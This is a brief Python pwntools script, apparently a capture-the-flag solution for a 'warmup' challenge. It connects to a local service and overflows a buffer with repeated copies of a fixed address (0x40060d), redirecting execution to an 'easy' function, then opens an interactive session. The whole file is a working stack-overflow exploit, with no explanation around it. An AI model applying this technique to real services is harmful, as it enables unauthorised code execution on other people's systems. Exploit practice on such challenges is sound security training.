#!/usr/bin/env python

from pwn import *

#r = process('warmup')
r = remote('127.0.0.1', 13337)

easy = 0x40060d
r.sendline(p64(easy) * (0x50 / 8))

r.interactive()
